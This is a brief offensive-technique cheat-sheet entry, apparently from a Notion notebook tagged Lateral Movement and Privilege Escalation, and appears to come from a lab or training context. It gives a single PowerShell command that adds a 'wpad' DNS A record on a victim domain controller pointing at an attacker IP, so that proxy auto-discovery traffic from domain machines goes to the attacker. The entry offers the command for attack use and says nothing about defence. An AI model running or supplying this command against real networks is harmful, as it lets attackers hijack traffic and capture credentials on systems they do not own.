# Add WPAD Record to Windows DNS Server

OS: Windows
Description: Add WPAD Record to Windows DNS Server
Security Domains: Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21), Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

```jsx
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.victimdomain.local -IPv4Address 10.10.14.3
```